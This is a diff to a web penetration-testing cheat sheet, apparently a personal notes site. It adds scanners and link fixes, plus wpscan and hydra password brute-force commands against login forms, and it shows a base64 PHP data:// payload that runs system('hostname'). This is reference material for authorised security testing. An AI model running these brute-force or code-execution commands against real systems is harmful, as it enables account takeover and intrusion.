@@ -9,6 +9,8 @@ Owasp's [web security testing guide](https://owasp.org/www-project-web-security-
 ## Vulnerability scanners
 
 * [nessus](https://www.tenable.com/products/nessus)
+* [burp suite pro](https://portswigger.net/burp/pro)
+* [zed attack proxy](https://www.zaproxy.org/)
 
 ## SSL Scans
 
@@ -68,10 +70,10 @@ Adding an [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/He
 
 Each tech has it's own injection technics:
 
-* [php](./injections/php)
-* [sql](./injections/sql)
-* [nosql](./injections/nosql)
-* [javascript](./injections/javascript)
+* [php](./injections/php.html)
+* [sql](./injections/sql.html)
+* [nosql](./injections/nosql.html)
+* [javascript](./injections/javascript.html)
 
 ## Reverse Connections
 
@@ -165,3 +167,21 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCdob3N0bmFtZScpOyA/Pg==
 ```
 
 (payload is base64 of `<?php system("hostname"); ?>`)
+
+## Dictionnary attack
+
+For wordpress
+
+```bash
+wpscan --url http://$TARGET --password-attack wp-login --passwords $WORDLIST
+```
+
+For hydra (`S=` for detecting Success and `F=` for detecting failure)
+
+```bash
+hydra -l $USERNAME -P $WORDLIST -t 32 -s $PORT $TARGET http-post-form "/$PATH:username=^USER^&password=^PASS^&...:S=JSESSIONID" -vV -f
+```
+
+## RCE
+
+[github.com/p0dalirius/Awesome-RCE-techniques](https://github.com/p0dalirius/Awesome-RCE-techniques)
